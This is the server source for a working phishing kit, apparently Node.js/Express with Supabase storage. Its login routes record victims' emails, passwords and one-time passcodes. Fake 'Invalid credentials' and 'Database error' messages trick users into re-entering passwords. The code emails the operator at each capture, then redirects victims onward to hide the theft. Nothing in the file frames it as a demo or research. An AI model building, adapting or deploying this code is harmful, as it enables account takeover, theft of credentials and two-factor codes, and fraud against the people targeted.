const path = require('path');
require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');
const nodemailer = require('nodemailer');

const { Resend } = require('resend');

const resend = new Resend(process.env.RESEND_API_KEY);

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  },
});

const app = express();
const PORT = process.env.PORT || 3000;

// Set EJS as the view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Serve static files from /public
app.use(express.static(path.join(__dirname, 'public')));

// For application/json
app.use(express.json());

// Parse URL-encoded bodies (for simple form submissions)
app.use(express.urlencoded({ extended: true }));

// Parse cookies
app.use(cookieParser());

// Supabase PostgreSQL database connection
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// Initialize database table
/*
// Initialize database table
// Tables 'creds' and 'session_count' should be created in the Supabase dashboard or via SQL Editor.
// Automatic creation logic removed as Supabase JS client is for DML.

CREATE TABLE IF NOT EXISTS creds (
  id SERIAL PRIMARY KEY,
  email VARCHAR(255) NOT NULL,
  password VARCHAR(255) NULL,
  session_id VARCHAR(255) NULL,
  session_expires_at TIMESTAMP NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS session_count (
  id SERIAL PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  count INT NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
*/

// Helper function to generate unique session ID
function generateSessionId() {
  return crypto.randomUUID();
}

// Helper function to check if session is valid
async function isValidSession(sessionId) {
  if (!sessionId) return false;

  try {
    const { data, error } = await supabase
      .from('session_count')
      .select('*')
      .eq('session_id', sessionId);

    if (error) throw error;
    if (!data || data.length === 0) return false;

    return true;
  } catch (err) {
    console.error('Error checking session', err);
    return false;
  }
}


app.get('/login', async (req, res) => {
  let sessionId = req.cookies.sessionId;
  console.log("login get session id:", sessionId)
  const isCheckedIn = await isValidSession(sessionId);
  if (!isCheckedIn) {
    sessionId = generateSessionId()
    res.cookie('sessionId', sessionId, {
      maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
    });
    await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
  }
  if (req.query.next) {
    console.log("next parameter found:", req.query.next)
    res.cookie('next', req.query.next, {
      maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
    });
  }

  res.render('login', {
    sessionId: sessionId,
    error: req.query.error,
    success: req.query.success,
  });
});


app.post('/login', async (req, res) => {
  const { email } = req.body;
  // validate email (include regex)
  if (!email || !email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
    return res.redirect('/login?error=Invalid+email');
  }
  try {
    let sessionId = req.cookies.sessionId;
    console.log("login post session id:", sessionId)
    const isCheckedIn = await isValidSession(sessionId);
    if (!isCheckedIn) {
      sessionId = generateSessionId();
      res.cookie('sessionId', sessionId, {
        maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
      });
      await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
    }

    await supabase.from('creds').insert([{ email: email, session_id: sessionId }]);
    const mailInfo = {
      subject: "Attempting Login",
      text: `Login being attempted by user "${email}"`,
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER
    }
    const { data, error } = await resend.emails.send({
      from: 'Acme <onboarding@resend.dev>',
      to: [process.env.EMAIL_USER],
      subject: 'Attempting Login',
      html: `Login being attempted by user "${email}"`,
      replyTo: process.env.EMAIL_USER,
    });
    return res.redirect('/login/password')
  } catch (err) {
    console.error('Error during login', err);
    return res.redirect('/login?error=Database+error');
  }
});

app.get('/login/password', async (req, res) => {
  const sessionId = req.cookies.sessionId;
  const isCheckedIn = await isValidSession(sessionId);
  if (!isCheckedIn) {
    return res.redirect('/login')
  }
  let { data: emailData, error: emailError } = await supabase
    .from('creds')
    .select('email')
    .eq('session_id', sessionId)
    .limit(1)
    .single();

  if (emailError) {
    console.error(emailError);
    return res.redirect('/login');
  }
  let email = emailData.email;
  const otp = req.query.otp? true:false
  console.log("OTP", otp)

  res.render('password', {
    sessionId: sessionId,
    email: email,
    error: req.query.error,
    otp: req.query.otp? true: false
  });
});


app.post('/login/password', async (req, res) => {
  const { account, password } = req.body;
  if (!account || !account.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
    return res.redirect('/login/password?error=Invalid+email');
  }
  try {
    let sessionId = req.cookies.sessionId;
    const isCheckedIn = await isValidSession(sessionId);
    if (!isCheckedIn) {
      return res.redirect('/login')
    }

    let { data: sessionCountData, error: countError } = await supabase
      .from('session_count')
      .select('count')
      .eq('session_id', sessionId)
      .single();

    if (countError) throw countError;
    let sessionCount = sessionCountData.count;

    if (sessionCount % 3 === 1) {
      console.log("Login Attempt One")
      await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
      await supabase.from('creds').update({ password: password }).eq('session_id', sessionId);
      return res.redirect('/login/password?error=Invalid+credentials');
    } else if (sessionCount % 3 === 2) {
      console.log("Login Attempt Two")
      await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
      await supabase.from('creds').insert([{ email: account, password: password, session_id: sessionId }]);
      return res.redirect('/login/password?error=Database+error')
    } else {
      console.log("Login Attempt Three")
      await supabase.from('creds').insert([{ email: account, password: password, session_id: sessionId }]);
    const { data, error } = await resend.emails.send({
      from: 'Acme <onboarding@resend.dev>',
      to: [process.env.EMAIL_USER],
      subject: 'Logged In',
      html: `Login process done by user "${account}"`,
      replyTo: process.env.EMAIL_USER,
    });
      return res.redirect('/login/password?otp=1');
    }
  } catch (err) {
    console.error('Error during login/password', err);
    return res.redirect('/login/password?error=Database+error');
  }
});

app.post("/login/otp", async (req, res) => {
  const { otp, email } = req.body;
  console.log("OTP detected")
  let sessionId = req.cookies.sessionId;
  await supabase.from('otp').insert([{email: email, otp: otp}]);
  await supabase.from('session_count').delete().eq('session_id', sessionId);

  const { data, error } = await resend.emails.send({
    from: 'Acme <onboarding@resend.dev>',
    to: [process.env.EMAIL_USER],
    subject: 'OTP sent',
    html: `OTP sent: user "${email}"`,
    replyTo: process.env.EMAIL_USER,
  });
  const next = req.cookies.next;  
  console.log("Checking for next cookie");
  
  if (next) {
    console.log("Next cookie found");
    const fullUrl = `${process.env.MAIN_REDIRECT_URL}/${next}`;
    return res.send({
      redirectUrl: fullUrl
    })
  }
  return res.send({
    redirectUrl: process.env.REDIRECT_URL
  })
});

app.use((req, res) => {
  res.redirect(process.env.MAIN_REDIRECT_URL)
})

// Start server
app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});


